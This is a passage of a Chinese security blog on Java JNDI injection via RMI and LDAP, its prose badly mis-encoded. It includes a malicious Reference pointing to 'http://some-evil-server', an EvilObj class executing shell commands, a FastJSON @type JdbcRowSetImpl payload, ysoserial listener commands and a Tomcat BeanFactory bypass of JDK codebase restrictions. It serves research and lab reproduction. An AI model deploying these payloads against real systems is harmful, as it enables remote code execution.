äº†com.sun.jndi.ldap.object.trustURLCodebaseé»˜è®¤ä¸ºfalseçš„é™åˆ¶ï¼Œä¹Ÿå°±æ„å‘³ç€è¿œç¨‹codebaseçš„Referenceæ–¹å¼è¢«é™åˆ¶æ­»äº†ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡SerializedDataçš„æ–¹æ³•æ¥è¾¾æˆåˆ©ç”¨ã€‚ æˆ‘ä»¬æ¥æ•´ç†ä¸€ä¸‹ï¼Œå…³äºjndiçš„ç›¸å…³å®‰å…¨æ›´æ–° JDK 6u132, JDK 7u122, JDK 8u113ä¸­æ·»åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseã€‚ å¯¼è‡´jndiçš„rmi referenceæ–¹å¼å¤±æ•ˆï¼Œä½†ldapçš„referenceæ–¹å¼ä»ç„¶å¯è¡Œ Oracle JDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å com.sun.jndi.ldap.object.trustURLCodebaseå±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseã€‚ å¯¼è‡´jndiçš„ldap referenceæ–¹å¼å¤±æ•ˆï¼Œåˆ°è¿™é‡Œä¸ºæ­¢ï¼Œè¿œç¨‹codebaseçš„æ–¹å¼åŸºæœ¬å¤±æ•ˆï¼Œé™¤éè®¤ä¸ºè®¾ä¸ºtrue è€Œåœ¨æœ€æ–°ç‰ˆçš„jdk8uä¸Šï¼Œjndi ldapçš„æœ¬åœ°ååºåˆ—åŒ–åˆ©ç”¨é“¾1å’Œ2çš„æ–¹å¼ä»ç„¶æœªå¤±æ•ˆï¼Œjndi rmiåº•å±‚(JRMPListener)StreamRemoteCallçš„æœ¬åœ°åˆ©ç”¨æ–¹å¼ä»æœªå¤±æ•ˆã€‚ æ‰€ä»¥å¦‚æœReferenceçš„æ–¹å¼ä¸è¡Œçš„æ—¶å€™ï¼Œå¯ä»¥è¯•è¯•åˆ©ç”¨æœ¬åœ°ClassPathé‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ¥è¾¾æˆRCEã€‚ 0x05 æ€»ç»“JNDIå’ŒLDAPçš„ç»“åˆï¼Œå‡ºç°äº†2ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€æ˜¯åˆ©ç”¨è¿œç¨‹codebaseçš„æ–¹å¼ï¼ŒäºŒæ˜¯åˆ©ç”¨æœ¬åœ°ClassPathé‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚åœ¨æœ€æ–°ç‰ˆçš„jdk8uä¸­ï¼Œcodebaseçš„æ–¹å¼ä¾èµ–com.sun.jndi.ldap.object.trustURLCodebaseçš„å€¼ï¼Œè€Œç¬¬äºŒç§æ–¹å¼ä»æœªå¤±æ•ˆã€‚ LDAPçš„ä½¿ç”¨æ–¹æ³•é™¤äº†JNDIçš„lookupï¼Œå…¶ä»–çš„åº“ä¹Ÿä¼šæœ‰ç›¸åº”çš„ä½¿ç”¨æ–¹æ³•ï¼Œå¦‚Springçš„ldapï¼Œè¿™é‡Œè¿˜å¯ä»¥ç»§ç»­æ·±å…¥ä¸‹å»ï¼Œå…ˆæŒ–ä¸ªå‘XD æœ€åï¼Œä¸Šé¢çš„ä¸¤ä¸ªldap Serveræ›´æ–°åˆ°äº†githubä¸Šï¼Œè‡ªå–XD"},{"title":"JNDI with RMI","permalink":"http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/","text":"0x00 å‰è¨€åœ¨ç°å®ç¯å¢ƒä¸­ï¼Œé‡åˆ°RMI Registryçš„æœºä¼šå¾ˆå°‘ï¼Œè€Œç»“åˆååºåˆ—åŒ–æ¼æ´çš„JNDIæ³¨å…¥åˆ™å¸¸è§äº†è®¸å¤šã€‚æœ¬æ–‡å°†ä»‹ç»RMIç»“åˆJNDIåå¯ä»¥åšå“ªäº›äº‹æƒ…XD 0x01 åŸºç¡€åœ¨çœ‹JNDIåŒRMIçš„åˆ©ç”¨å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å…³äºRMIåŠ¨æ€ç±»åŠ è½½çš„æ¦‚å¿µã€‚ RMIåŠ¨æ€ç±»åŠ è½½RMIæœ‰ä¸€ä¸ªé‡è¦çš„ç‰¹æ€§æ˜¯åŠ¨æ€ç±»åŠ è½½æœºåˆ¶ï¼Œå½“æœ¬åœ°CLASSPATHä¸­æ— æ³•æ‰¾åˆ°ç›¸åº”çš„ç±»æ—¶ï¼Œä¼šåœ¨æŒ‡å®šçš„codebaseé‡ŒåŠ è½½classã€‚codebaseå¯ä»¥åœ¨ç³»ç»Ÿå±æ€§java.rmi.server.codebaseè®¾ç½®å…¶URLã€‚å¦‚æœcodebaseçš„URLå¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è½½å…¥ä»»æ„çš„classæˆ–jaræ–‡ä»¶ã€‚æ ¹æ®Pç‰›çš„Javaå®‰å…¨æ¼«è°ˆ- RMIç¯‡ä¸­æåˆ°ï¼Œé€šè¿‡ä¿®æ”¹ä¼ é€’è¿‡ç¨‹ä¸­çš„åºåˆ—åŒ–æ•°æ®ï¼Œå°†å…¶ä¸­çš„codebaseä¿®æ”¹ä¸ºæ¶æ„çš„serverï¼Œè¿™æ ·å¯ä»¥è¾¾åˆ°RMI Serverç«¯è¢«æ”»å‡»çš„æ•ˆæœã€‚ä¸è¿‡ï¼Œè¿™ä¸ªåˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œå¹¶ä¸”oracleåœ¨åé¢å¯¹å…¶åšäº†é™åˆ¶ï¼Œå¦‚æœè¦æˆåŠŸåˆ©ç”¨éœ€è¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼š å®‰è£…å¹¶é…ç½®äº†SecurityManager Javaç‰ˆæœ¬ä½äº7u21ï¼Œ6u45æˆ–è€…è®¾ç½®äº†java.rmi.server.useCodebaseonly=false æ‘˜è‡ªJavaå®‰å…¨æ¼«è°ˆ-RMIç¯‡ å…¶ä¸­ä¸Šé¢çš„é…ç½®ï¼Œåœ¨7u21ï¼Œ6u45åçš„ç‰ˆæœ¬é‡Œé»˜è®¤ä¸ºtrueï¼Œé‚£ä¹ˆä¹Ÿå°±æ— æ³•ä»è¿œç¨‹codebaseä¸­è½½å…¥ç±»ï¼Œé¿å…äº†ä¸Šé¢è¯´çš„è¿™ç§æ”»å‡»çš„å¯èƒ½æ€§ã€‚ JNDIçš„ç›¸å…³æ¦‚å¿µ Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf JNDIæ–¹ä¾¿äº†ä¸naming serviceå’ŒDirectory serviceçš„äº¤äº’ï¼Œé€šè¿‡æŒ‡å®šç‰¹å®šçš„URLå³å¯ä¸ä¸åŒçš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚ç›¸å½“äºå¯¹è¿™äº›æœåŠ¡çš„APIåˆè¿›è¡Œäº†ä¸€æ¬¡å°è£…ä¾›å¼€å‘äººå‘˜ä½¿ç”¨ã€‚å…¶ä¸­JNDIä¸­ä¹Ÿå­˜åœ¨ä¸Šè¿°RMI codebaseçš„åŠ¨æ€åŠ è½½æœºåˆ¶ï¼Œå¹¶ä¸”å…¶é…ç½®åŒåº•å±‚çš„RMIé…ç½®å¹¶ä¸ç›¸å…³ã€‚ ä»ä¸Šè¿°çš„æ„æ¶æ¥çœ‹ï¼ŒåŠ¨æ€åŠ è½½å‘ç”Ÿäºä¸¤ä¸ªéƒ¨åˆ†ï¼ŒNaming Managerå’ŒJNDI SPIã€‚è¿™é‡ŒSPIéƒ¨åˆ†å°±æ˜¯ç›¸å¯¹åº”çš„æœåŠ¡çš„é…ç½®ï¼Œæ¯”å¦‚å‰æ–‡æåˆ°çš„RMIçš„é™åˆ¶å°±æ˜¯SPIéƒ¨åˆ†çš„ã€‚è€ŒNaming Managerä¹Ÿå­˜åœ¨ä¸€ä¸ªåŠ¨æ€åŠ è½½æœºåˆ¶å¹¶ä¸”å…¶åœ¨ä¿®å¤å‰å¹¶æ— é™åˆ¶ï¼Œè¿™é‡ŒNaming Manageréƒ¨åˆ†ç”¨åˆ°çš„æ˜¯JNDIçš„Naming References In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate. For such needs, JNDI defined Naming References (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf è¿™é‡Œæåˆ°ç”±äºæŸäº›æƒ…å†µä¸èƒ½ç›´æ¥å°†è¿œç¨‹objè¿”å›ï¼Œæ‰€ä»¥JNDIæå‡ºäº†Naming Referencesçš„æ–¹æ³•ï¼Œè¿”å›ç›¸åº”çš„Referenceè€Œä¸è¿”å›å…·ä½“çš„objã€‚ç»Ÿä¸€ç”±JNDIçš„è¯·æ±‚ç«¯å»åŠ è½½æŒ‡å®šçš„åœ°å€ä¸Šçš„objã€‚è¿™é‡ŒåŠ è½½æ–¹æ³•ä¸­å°±åŒ…æ‹¬è¿œç¨‹codebaseçš„æ–¹æ³•ï¼Œæ¥çœ‹ä¸ªä¾‹å­ 1234String FactoryURL = \"http://some-evil-server\";Reference reference = new Reference(\"MyClass\",\"MyClass\",FactoryURL);ReferenceWrapper wrapper = new ReferenceWrapper(reference);ctx.bind(\"Foo\", wrapper);// ç»‘å®šreference è¯·æ±‚ç«¯ä»¥lookupè¯·æ±‚ä¸Šè¿°ç»‘å®šçš„RMIæœåŠ¡å³å¯ã€‚å…¶å¤„ç†è¿‡ç¨‹å¼•ç”¨https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 0x02 åŸç†JNDI with RMI DEMOä¸ºäº†æ›´å¥½çš„è¯´æ˜ï¼Œä»¥ä¸‹é¢çš„ä»£ç ä¸ºä¾‹ 1234567891011121314151617181920212223package train.jndi;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;/** * @author wh1t3P1g * @since 2020/2/4 */public class Server &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); String FactoryURL = \"http://localhost/\"; Reference reference = new Reference(\"EvilObj\",\"EvilObj\",FactoryURL); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"Foo\", wrapper); &#125;&#125; Serverç«¯ä»¥RMI Registryæ³¨å†Œä¸€ä¸ªReferenceï¼Œå¹¶å°†factoryURLæŒ‡å®šä¸ºlocalhost 123456789101112131415package train.jndi;import javax.naming.Context;import javax.naming.InitialContext;/** * @author wh1t3P1g * @since 2020/2/4 */public class Client &#123; public static void main(String[] args) throws Exception &#123; Context ctx = new InitialContext(); ctx.lookup(\"rmi://localhost:1099/Foo\"); &#125;&#125; Clientç«¯æ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä»¥lookupæŒ‡å®šçš„RMI URLå³å¯ã€‚æ ¹æ®ä¸Šé¢çš„è¿‡ç¨‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯æœ€ç»ˆæ‰§è¡ŒEvilObjçš„åœ°æ–¹æ˜¯Clientç«¯(jndiå‘èµ·lookupçš„æ–¹æ³•)ã€‚æœ€åæˆ‘ä»¬åˆ›ä¸€ä¸ªEvilObj 123456789101112/** * @author wh1t3P1g * @since 2020/2/4 */public class EvilObj &#123; public EvilObj() throws Exception &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;\"/bin/sh\", \"-c\", \"open /System/Applications/Calculator.app\"&#125;; rt.exec(commands); &#125;&#125; javac EvilObj.javaç”ŸæˆEvilObj.classï¼Œç„¶åæŒ‚è½½åˆ°ä¸€ä¸ªwebæœåŠ¡ä¸Šå°±å¯ä»¥äº†ã€‚å¯ä»¥ç›´æ¥é€‰æ‹©pythonæ¥æŒ‚è½½ é‚£ä¹ˆæˆ‘ä»¬æ¥å…·ä½“çœ‹ä¸€ä¸‹lookupå‡½æ•°å…·ä½“åšäº†ä»€ä¹ˆ é¦–å…ˆInitialContextçš„lookupå‡½æ•°ï¼Œä¼šæ ¹æ®æä¾›çš„URLè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„InitialContextï¼ˆåˆ†ç¦»å‡ºåè®®åè¿›è¡Œé€‰æ‹©ï¼‰ï¼Œæ¯”å¦‚æ­¤æ—¶çš„InitialContextä¸ºrmiURLContext ç»§ç»­è·Ÿè¿›com/sun/jndi/toolkit/url/GenericURLContext.java#lookup è¿™é‡Œçš„ctxä¸ºRegistryContextï¼Œå°†å¯¹æŒ‡å®šçš„RMI Registryè·å–ç»‘å®šçš„obj è·å–åˆ°è¿œç¨‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨decodeObjectå‡½æ•° å¦‚æœå½“å‰çš„remoteå¯¹è±¡æ˜¯RemoteReferenceç±»å‹ï¼Œåˆ™è¿›ä¸€æ­¥è¯·æ±‚Registryè·å–è¯¥Referenceçš„å†…å®¹ã€‚åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„è¯·æ±‚å°±åŒServerç«¯çš„å…³ç³»ä¸å¤§äº†ï¼ŒClientä¼šæ ¹æ®æ‹¿åˆ°çš„Referenceè¯·æ±‚ç›¸åº”çš„æœåŠ¡å™¨ ç»§ç»­è·Ÿè¿›getObjectInstance è¿™é‡Œä¼šç»§ç»­è°ƒç”¨NamingManagerçš„getObjectFactoryFromReferenceï¼Œè¯¥å‡½æ•°å®Œæˆäº†å‘FactoryURLè¯·æ±‚å…·ä½“çš„classæ–‡ä»¶çš„åŠŸèƒ½ã€‚ è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæ ¹æ®factoryNameå’Œcodebaseå°†è¿œç¨‹è½½å…¥ç›¸åº”çš„classæ–‡ä»¶(è¿™é‡Œçš„loadClassç”¨çš„URLClassLoaderæ¥å®Œæˆä»»åŠ¡) å¹¶åœ¨ç¬¬163è¡Œå¯¹è½½å…¥çš„objè¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æŠŠpayloadå†™åœ¨æ„é€ å‡½æ•°é‡Œã€‚ åœ¨åˆ©ç”¨ä¸­ï¼Œlookupå‡½æ•°çš„å‚æ•°å¿…é¡»æ˜¯å¯æ§çš„ï¼Œæˆ–è€…åˆ©ç”¨ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„æ–¹å¼æ¥å®Œæˆï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¸¤ä¸ªæ¡ˆä¾‹ æ¡ˆä¾‹ä¸€ï¼šSpringæ¡†æ¶çš„JtaTransactionManagerç±»16å¹´çš„æ—¶å€™Springæ¡†æ¶æš´äº†ä¸€ä¸ªååºåˆ—åŒ–çš„å¯åˆ©ç”¨ç‚¹JtaTransactionManagerï¼Œå…¶åŸç†å°±æ˜¯åˆ©ç”¨äº†JNDI å¯æ§çš„lookupå‚æ•°ï¼ˆè¿™é‡Œçš„å¯æ§ç”±ååºåˆ—åŒ–æ¥å®Œæˆï¼‰ã€‚æ¥çœ‹ä¸€ä¸‹åŸç† org/springframework/transaction/jta/JtaTransactionManager.java#readObject è¿™é‡Œ1230è¡Œåˆå§‹åŒ–äº†ä¸€ä¸ªjdniçš„contextï¼Œè¿™ä¸ªcontextå°†ç”¨äºåç»­çš„JNDI lookup ç»§ç»­è·Ÿè¿›initUserTransactionAndTranscationManager ç»§ç»­è·Ÿè¿›lookupUserTransaction è¿™é‡Œæœ€ç»ˆè°ƒç”¨äº†contextçš„lookupå‡½æ•°ï¼Œå¹¶ä¸”å…¶å‚æ•°ä¸ºuserTransactionNameï¼Œè¿™ä¸ªéƒ¨åˆ†æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å‰è¿›è¡Œæ„é€ ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç (æ›´æ–°åœ¨äº†ysoserialçš„spring3ä¸Š) åˆ°äº†å¦‚ä»Š2020å¹´ï¼Œè¿™ä¸ªç±»çš„åˆ©ç”¨ä»ç„¶å­˜åœ¨äºæœ€æ–°ç‰ˆçš„Spring-txç»„ä»¶ä¸ŠXD æ¡ˆä¾‹äºŒï¼šFastJSONååºåˆ—åŒ–POC JdbcRowSetImplç±»fastjsonç”±äº@typeçš„å­˜åœ¨ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶å¯ä»¥å¯¹ä»»æ„æŒ‡å®šçš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼Œæ ¹æ®è§„åˆ™è‡ªåŠ¨è°ƒç”¨setter/getteræ¥è¾¾åˆ°å®ä¾‹è¿˜åŸçš„ç›®çš„ã€‚é¦–å…ˆæ¥çœ‹ä¸€ä¸‹POC 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\":true&#125; è¿™é‡Œçš„å…³é”®åœ¨äºautoCommitï¼Œæ¥çœ‹ä¸€ä¸‹JdbcRowSetImplçš„setAutoCommitå‡½æ•° è¿™é‡Œå¦‚æœconnä¸ºnullçš„è¯ï¼Œä¼šè°ƒç”¨connectå‡½æ•°ï¼Œçœ‹ä¸€ä¸‹connectå‡½æ•° çœ‹åˆ°è¿™é‡Œç”¨JNDIè¿›è¡Œæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”ç”±äºfastjsonçš„ç‰¹æ€§dataSourceæ˜¯å¯æ§çš„ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ§åˆ¶lookupçš„å‚æ•°ï¼Œå¹¶å‘æ¶æ„çš„serverå‘èµ·JNDIè¿æ¥ã€‚æ ¹æ®å‰æ–‡è¯´çš„åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å¾—ä¸»æœºæ‰§è¡Œä»»æ„ä»£ç ã€‚ 0x03 ç¯å¢ƒå¤ç°æ”¹é€ JRMPListenerç”±äºJNDIåº•å±‚ç”¨çš„éƒ½æ˜¯RMIçš„ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å»ºç«‹ä¸€ä¸ªç»‘å®šäº†Referenceçš„RMIæœåŠ¡ï¼Œå¯ä»¥ç›´æ¥æ”¹æ”¹JRMPListenerã€‚ åœ¨RMIéƒ¨åˆ†æ›¾ç»åˆ†æè¿‡JRMPListenerï¼Œå…¶è¿”å›äº†ExceptionalReturnï¼Œä½¿å¾—æ„é€ å¥½çš„Exceptionåœ¨Clientååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤ã€‚è€Œå¯¹äºç»‘å®šReferenceï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ExceptionalReturnä¸ºNormalReturnå¹¶å°†payloadObjectæ”¹ä¸ºReferenceWrapper payloadObjectæ”¹ä¸ºReferenceWrapper ä½†æ˜¯åœ¨å®é™…æµ‹è¯•æ—¶ï¼Œå‘ç°Clientè¯·æ±‚åä¸èƒ½å®Œå…¨é€€å‡ºã€‚å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä¸Šé¢çš„ä¾‹å­ ä¸è¿‡è¿™é‡Œå°±è·å–ä¸åˆ°æ˜¯å¦æœ‰è®¿é—®è¿›æ¥ï¼Œæ ¹æ®å®é™…çš„ç¯å¢ƒå–èˆå§XD æ”¹é€ åçš„å·²æ›´æ–°åˆ°githubä¸Š 12345678// å¼€å¯æŒ‚è½½äº†evil classæ–‡ä»¶çš„HTTP Serverjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj \"open /System/Applications/Calculator.app\"// å¼€å¯RMI Reference Listenerjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/// æˆ–è€…ä½¿ç”¨RMIRefListener2ï¼Œé›†åˆäº†ä¸Šé¢ä¸¤ä¸ªæ­¥éª¤java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj \"open /System/Applications/Calculator.app\" FastJSON 1.2.24 RCEè¿™é‡Œæˆ‘ä»¬ä»¥FastJSON 1.2.24ç‰ˆæœ¬çš„RCEä¸ºä¾‹ï¼Œæ¥è¯•éªŒJNDI é¦–å…ˆå¼€å¯ä¸€ä¸ªevil rmi server 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj \"touch /tmp/success\" ç”¨vulhubçš„ç¯å¢ƒ åœ¨æœåŠ¡å™¨ç«¯ä¼šæ¥æ”¶åˆ°è¿æ¥ è¿›åˆ°dockeré‡Œå¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†successæ–‡ä»¶ 0x04 åç»­å‰æ–‡ç”¨çš„ç¯å¢ƒæ˜¯JDK8u111ï¼Œåœ¨åç»­çš„JDK8u113ä»¥åŠJDK6u132, JDK7u122ä¹‹åå¢åŠ äº†å¯¹è¿œç¨‹codebaseçš„é™åˆ¶ ç³»ç»Ÿå±æ€§ com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚å¦‚æœéœ€è¦å¼€å¯ RMI Registry æˆ–è€… COS Naming Service Providerçš„è¿œç¨‹ç±»åŠ è½½åŠŸèƒ½ï¼Œéœ€è¦å°†å‰é¢è¯´çš„ä¸¤ä¸ªå±æ€§å€¼è®¾ç½®ä¸ºtrueã€‚ Changelog: JDK 6u141 http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141 JDK 7u131 http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html JDK 8u121 http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html æ‘˜è‡ªhttps://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html é‚£ä¹ˆå¦‚æœå­˜åœ¨è¿™æ ·ä¸€ä¸ªæ¼æ´ä½†æ˜¯åˆæ˜¯é«˜ç‰ˆæœ¬çš„JDKç¯å¢ƒï¼Œè¯¥æ€ä¹ˆè¿›è¡Œbypasså‘¢ï¼Ÿ æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°CLASSPATHä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„Reference Factoryå·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„Factoryç±»æ‰§è¡Œå‘½ä»¤ã€‚ åˆ©ç”¨LDAPç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–Gadgetå®Œæˆå‘½ä»¤æ‰§è¡Œã€‚ æ‘˜è‡ªhttps://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html ä¸Šé¢çš„è¿™ç¯‡æ–‡ç« æå‡ºäº†ä¸Šé¢ä¸¤ç§æ–¹æ¡ˆæ¥è¿›è¡Œã€‚ åˆ©ç”¨åº•å±‚åè®®å®ç°ä¸Šçš„æ¼æ´å…ˆæ¥è¯´ä¸€ä¸‹ç¬¬äºŒç§ï¼Œè¿™é‡Œæåˆ°åˆ©ç”¨çš„æ˜¯LDAPï¼Œè¿™éƒ¨åˆ†æˆ‘ä»¬åé¢å†è¯¦ç»†å™è¿°ï¼Œå…¶å®åŸç†è·ŸRMIçš„ååºåˆ—åŒ–é—®é¢˜æ˜¯ä¸€æ ·çš„ã€‚ æˆ‘åœ¨æµ…è°ˆJava RMIååºåˆ—åŒ–é—®é¢˜ä¸­æ›¾æåˆ°è¿‡ï¼ŒJRMPListeneråˆ©ç”¨çš„æ˜¯RMI Clientåœ¨æ¥æ”¶Exceptionæ—¶å‘ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ã€‚è€Œè¿™é‡Œçš„JNDIåº•å±‚ç”¨çš„ä»ç„¶æ˜¯RMIé‚£å¥—(å¦‚æœåè®®æ˜¯RMIçš„è¯)ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘èµ·ä¸€ä¸ªé“¾æ¥åˆ°ysoserialçš„JRMPListenerä¹Ÿè¿˜æ˜¯èƒ½æˆåŠŸåˆ©ç”¨çš„ï¼Œä¸ç®¡æœ‰æ²¡æœ‰è®¾ç½®com.sun.jndi.rmi.object.trustURLCodebaseä¸ºtrueã€‚å½“ç„¶å¦‚æœè¦åˆ©ç”¨æˆåŠŸï¼Œå‘èµ·ç«¯å¿…é¡»è¦æœ‰ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰€ä¾èµ–çš„ç»„ä»¶å¹¶ä¸”åˆé€‚çš„JDKç‰ˆæœ¬æ‰å¯ä»¥ã€‚ åˆ©ç”¨å¯åˆ©ç”¨çš„æœ¬åœ°Factoryå¯¹è±¡ç„¶åæˆ‘ä»¬æ¥ç»§ç»­çœ‹çœ‹ç¬¬ä¸€ç§æƒ…å†µ åœ¨å‰é¢åˆ†æNamingManagerçš„getObjectFactoryFromReferenceæ—¶ï¼Œæˆ‘ç•¥è¿‡äº†æœ¬åœ°çš„factoryçš„è½½å…¥éƒ¨åˆ†çš„ä»£ç  è¿™é‡Œé¦–å…ˆä¼šåœ¨æœ¬åœ°çš„CLASSPATHé‡Œæ‰¾è¿™ä¸ªfactoryNameï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåç»­å°±ä¸ç”¨è¿›è¡Œè¿œç¨‹åŠ è½½ã€‚æ‰€ä»¥å¦‚æœæœ¬åœ°å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯åˆ©ç”¨çš„factoryï¼Œä¹Ÿèƒ½çªç ´JNDIçš„è¿œç¨‹åŠ è½½çš„é™åˆ¶ã€‚ å‰é¢çš„æ–‡ç« ä¸­æåˆ°äº†tomcatï¼ˆæˆ–glassfishï¼‰ä¸­çš„BeanFactoryçš„åˆ©ç”¨ï¼Œæ¥åˆ†æä¸€ä¸‹ é¦–å…ˆåœ¨åç»­çš„è°ƒç”¨ä¸­ï¼Œfactoryçš„getObjectInstanceå‡½æ•°å°†ä¼šè¢«è°ƒç”¨ 123// ref ä¸ºæˆ‘ä»¬ä¼ å…¥çš„Reference å¯æ§// name ä¸ºfactoryçš„nameï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬è‡ªå·±ä¼ªé€ çš„*EvilObj* å¯æ§factory.getObjectInstance(ref, name, nameCtx, environment); æ¥çœ‹ä¸€ä¸‹BeanFactoryä¸­getObjectInstanceå‡½æ•°çš„å®ç°ï¼Œå‡½æ•°æœ‰ç‚¹é•¿ï¼Œæˆ‘ä»¬æŒ‘é‡ç‚¹çœ‹ 123456789101112131415161718192021222324if (obj instanceof ResourceRef) &#123; try &#123; Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) &#123; try &#123; beanClass = tcl.loadClass(beanClassName);// è½½å…¥æŒ‡å®šclass &#125; catch(ClassNotFoundException e) &#123; &#125; &#125; else &#123; try &#123; beanClass = Class.forName(beanClassName);// è½½å…¥æŒ‡å®šclass &#125; catch(ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; // ... // ... Object bean = beanClass.newInstance();// å®ä¾‹åŒ– å…ˆçœ‹è¿™éƒ¨åˆ†ä»£ç ï¼Œå½“å‰æˆ‘ä»¬ä¼ å…¥çš„Referenceå¿…é¡»æ˜¯ResourceRefå¯¹è±¡ï¼Œå¹¶åœ¨åç»­åŠ è½½ResourceRefçš„beanClasså’ŒshilihuanewInstanceè¿›è¡Œ(è€Œè¿™é‡Œçš„classæˆ‘ä»¬å¯ä»¥åœ¨èµ‹å€¼æ—¶éšæ„æŒ‡å®š)ã€‚ 123456789101112131415161718192021222324252627RefAddr ra = ref.get(\"forceString\");Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;();String value;if (ra != null) &#123; value = (String)ra.getContent(); // ... /* Items are given as comma separated list */ for (String param: value.split(\",\")) &#123; param = param.trim(); index = param.indexOf('='); if (index &gt;= 0) &#123;// å¦‚æœå†…å®¹ä¸­å­˜åœ¨=ï¼Œæå–=åé¢çš„å­—ç¬¦ä¸²ä½œä¸ºå‡½æ•°å setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); &#125; else &#123; setterName = \"set\" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1); &#125; try &#123; forced.put(param, beanClass.getMethod(setterName, paramTypes)); &#125; // ... &#125;&#125; 